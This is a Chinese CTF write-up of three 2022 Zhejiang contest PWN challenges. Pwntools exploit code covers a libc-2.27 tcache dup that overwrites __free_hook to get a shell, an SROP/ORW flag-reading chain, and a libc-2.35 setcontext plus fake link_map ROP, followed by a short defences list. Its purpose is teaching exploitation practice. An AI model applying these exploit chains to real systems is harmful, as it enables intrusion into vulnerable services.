---
title: 2022 浙江省赛 PWN 题解析（看雪 Nameless_a）
contest: 2022 浙江省赛 / 看雪
year: 2022
difficulty: hard
vuln_type: [heap_exploit, ret2libc, pwn_unknown]
tags: [libc-2.27, __free_hook, tcache, unsorted-bin, UAF, setcontext, ORW, fake-link_map, IO_FILE, large-bin-attack, SROP]
attack_chain: ["Proof-of-work: SHA256 4 字符爆破", "fengshui 堆布局：0x418 + 0x410 + 0x410 + 0x420 + 0x420 chunk", "free 0x420 触发 unsorted bin 残留指针 → show leak libcbase", "tcache dup 写 __free_hook = system", "edit '/bin/sh\\x00' + delet(0) → system('/bin/sh')", "glibc 2.35 升级版：setcontext+61 控制 rsp/rip + ORW (open/read/write) 读 flag", "fake link_map 走 _dl_fini ROP 触发 _rtld_global 链"]
key_payload: "pd = p64(gold_key)+p64(free_hook) + p64(setcontext+61) + './flag\\x00'"
one_liner: 堆题两套解：libc2.27 __free_hook；libc2.35 setcontext+ORW+fake link_map
lesson: 堆题要分清 libc 版本；2.27 直接 tcache dup + free_hook；2.35 走 setcontext+61 + 大数 ORW
quality: high
---

# 2022 浙江省赛 PWN 题解析（看雪 Nameless_a）

原文 https://www.ctfiot.com/61633.html （看雪论坛 Nameless_a）

## 题目
3 道 PWN：
1. **babyheap** (libc-2.27) — tcache + unsorted bin 经典
2. **贪吃蛇/w/s/d** (栈 SROP) — `pop_rax; syscall; leave` 拿 ORW shell
3. **sp1 banana** (libc-2.35) — 高级 IO_FILE + setcontext + fake link_map

## 1) babyheap (libc-2.27)
```python
r = remote("1.14.97.218", 24360)
libc = ELF("./libc-2.27.so")

# 1) leak heap
add(0x7f); add(0x7f)
delet(0)
edit(0, "nameless")
show(0)
r.recvuntil("nameless")
heapbase = u64(r.recv(6).ljust(8, "\x00")) - 0x10

# 2) leak libc
for i in range(7):
    edit(0, p64(0)*2)
delet(0)
show(0)
libcbase = u64(r.recv(6).ljust(8, '\x00')) - 0x3ebca0

# 3) tcache dup → free_hook
free_hook = libcbase + libc.sym["__free_hook"]
system = libcbase + libc.sym["system"]
edit(0, p64(free_hook))
add(0x7f); add(0x7f)
edit(3, p64(system))
edit(0, "/bin/sh\x00")
delet(0)
r.interactive()
```

## 2) SROP ORW（无 system）
```python
# 贪吃蛇 走 w/s/d 触发栈溢出
pd1 = flat(
    pop_rax_ret, 0,           # read
    pop_rdi_ret, 0,           # stdin
    pop_rsi_ret, bss,
    pop_rdx_ret, 0x210,
    syscall,
    leave_ret                 # 跳到 bss
)
# 第二段 bss 上的 ORW
pd = flat(
    0,
    pop_rax_ret, 2,           # open
    pop_rdi_ret, flag_addr,
    pop_rsi_ret, 0,
    pop_rdx_ret, 0,
    syscall,
    pop_rax_ret, 0,           # read
    pop_rdi_ret, 3,
    pop_rsi_ret, flag_addr,
    pop_rdx_ret, 0x210,
    syscall,
    pop_rax_ret, 1,           # write
    pop_rdi_ret, 1,
    pop_rsi_ret, flag_addr,
    pop_rdx_ret, 0x210,
    syscall,
    0xdeadbeef
).ljust(0x200, "a") + "./flag\x00"
r.sendlineafter("flag\x00", 0x178*"a" + p64(bss) + pd1)
r.sendline(pd)
```

## 3) sp1 banana (libc-2.35) 高级堆
```python
# 1) leak libc
add(0x418,"nameless"); add(0x410,"nameless")
add(0x410,"ymnhymnh"); add(0x420,"x1ngx1ng")
add(0x420,"nameless")
delet(3)
show(3)
libcbase = u64(r.recv(6).ljust(8,"\x00")) - 0x1f2cc0

# 2) setcontext+61 控 rsp/rip + ORW
setcontext = libcbase + libc.sym['setcontext']
flag_addr = heap_base + 0x4770 + 0x100
chain = flat(
    pop_rdi_ret, flag_addr, pop_rsi_ret, 0, open_addr,
    pop_rdi_ret, 3, pop_rsi_ret, flag_addr, pop_rdx_pop_rbx_ret, 0x100, 0, read_addr,
    pop_rdi_ret, flag_addr, puts_addr
).ljust(0x100, '\x00') + 'flag\x00'

# 3) large bin attack 改 TLS
# 4) fake link_map 走 _dl_fini
fake_link_map = p64(0)*3 + p64(link_4_addr)
fake_link_map += p64(magic) + p64(ret) + p64(0) + rop_chain
fake_link_map = fake_link_map.ljust(0xc8, ' ') + p64(link_4_addr + 0x28 + 0x18)  # RSP
fake_link_map += p64(pop_rdi_ret)  # RCX → RIP
fake_link_map = fake_link_map.ljust(0x100, '\x00')
fake_link_map += p64(link_4_addr + 0x10 + 0x110) * 3 + p64(0x10)
fake_link_map = fake_link_map.ljust(0x31C - 0x10, '\x00') + p8(0x8)
edit(1, ' '*0x520 + p64(link_4_addr + 0x20))
```

## 教学要点
- **libc 版本决定利用路线**：
  - 2.27：tcache 无 double free 检查 → 直接 tcache dup + free_hook
  - 2.31+：tcache key 检查 → 走 IO_FILE / setcontext / _rtld_global
- **setcontext+61**：x86_64 偏移 61 处 `mov rsp, [rdi+0xa0]; ... push [rdi+0xa8]; ret` → 控所有寄存器
- **ORW (open/read/write)**：当 system 不可用（如 sandbox seccomp / 静态编译）时用 syscall
- **fake link_map**：劫持 _rtld_global._dl_ns._ns_loaded 链触发 _dl_fini 走 ROP
- **SROP**：栈迁移到 bss 后用 sigreturn 一次性设置所有寄存器

## 防御
- 高版本 libc tcache 加 key + 指针保护
- 开启 sandbox / seccomp 拦截 execve
- free_hook / malloc_hook 在 2.34 移除
